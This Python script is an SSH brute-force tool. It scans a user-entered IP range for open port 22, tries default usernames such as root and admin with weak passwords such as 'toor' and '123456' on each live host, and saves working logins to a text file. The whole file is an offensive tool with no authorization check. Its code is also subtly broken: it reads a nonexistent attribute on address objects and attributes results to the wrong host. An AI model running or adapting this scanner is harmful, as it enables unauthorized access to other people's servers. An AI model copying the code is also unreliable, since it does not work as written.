import asyncio
import socket
import time
import paramiko
import logging
import ipaddress
from rich.console import Console
from rich.table import Table
from rich.logging import RichHandler

console = Console()
console.print("Let's scan for SSH credentials...", style="bold blue")

logging.basicConfig(
    level="NOTSET",
    format="%(message)s",
    handlers=[RichHandler(console=console, markup=True)]
)

log = logging.getLogger("scancodes")

async def check_port(ip_address, port):
    try:
        await asyncio.wait_for(asyncio.open_connection(ip_address.ip, port), timeout=0.5)
        return ip_address
    except:
        return None

async def scan_ips(ip_range, port):
    loop = asyncio.get_event_loop()
    tasks = []
    for i in ip_range:
        tasks.append(loop.create_task(check_port(i, port)))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    live_ips = [x for x in results if x is not None]
    return live_ips

async def try_ssh(ip_address, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip_address, username=username, password=password, timeout=0.5, banner_timeout=5)
        return username, password
    except:
        return None, None

async def scan_ssh(ip_address):
    loop = asyncio.get_event_loop()
    usernames = ['root', 'admin', 'ubuntu','kali']
    passwords = ['password', '123456', 'admin', 'toor', 'qwerty']
    tasks = []
    for user in usernames:
        for password in passwords:
            tasks.append(loop.create_task(try_ssh(ip_address, user, password)))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    credentials = [x for x in results if x[0] is not None]
    return credentials

async def main():
    while True:
        ip_range = input("Please enter the IP range to be scanned: ")
        try:
            ip_network = ipaddress.ip_network(ip_range)
            break
        except ValueError:
            print("Invalid IP range format. Please try again.")

    port = 22
    live_ips = await scan_ips(list(ip_network.hosts()), port)

    credentials = []
    for ip in live_ips:
        credentials.extend(await scan_ssh(ip))

    # Print as a neat and colorful table:
    table = Table(title="SSH Credentials")
    table.add_column("IP Address", justify="center", style="cyan", no_wrap=True)
    table.add_column("Username", justify="center", style="purple")
    table.add_column("Password", justify="center", style="green")

    for credential in credentials:
        table.add_row(f"[bold]{ip}[/bold]", credential[0], credential[1])
        log.info(f"{ip}: Username={credential[0]}, Password={credential[1]}")

    console.print(table)

    # Write to text file:
    with open("successful_logins.txt", "a") as f:
        for credential in credentials:
            f.write(f"{ip}\t{credential[0]}\t{credential[1]}\n")

if __name__ == '__main__':
    asyncio.run(main())
